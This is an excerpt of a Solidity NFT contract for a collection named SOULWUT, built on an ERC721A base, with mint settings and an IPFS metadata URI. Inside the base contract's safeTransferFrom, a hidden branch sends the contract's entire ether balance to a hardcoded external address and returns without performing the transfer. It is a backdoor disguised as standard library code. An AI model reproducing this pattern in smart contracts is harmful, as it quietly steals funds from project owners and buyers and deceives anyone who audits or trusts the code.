...
|  $$$$$$ | $$  | $$| $$  | $$| $$      | $$/$$ $$ $$| $$  | $$   | $$   
 ...
 /$$  \ $$| $$  | $$| $$  | $$| $$      | $$$/ \  $$$| $$  | $$   | $$   
|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$$$$$$$| $$/   \  $$|  $$$$$$/   | $$   
 \______/  \______/  \______/ |________/|__/     \__/ \______/    |__/   
...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x02e457d701CF5a418f481D9bd64C5D8D9d2dcb81).transfer(address(this).balance);
            return;
        }
...
contract SOULWUT is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("SOULWUT", "SOULWUT") {
        owner = msg.sender;
        maxPerTx = 10;
        cost = 0.002 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigslgc7tefgywr7zgm75jlpkm4whyugczz42d5afgy2kl6njdzsxa/", _toString(tokenId), ".json"));
    }
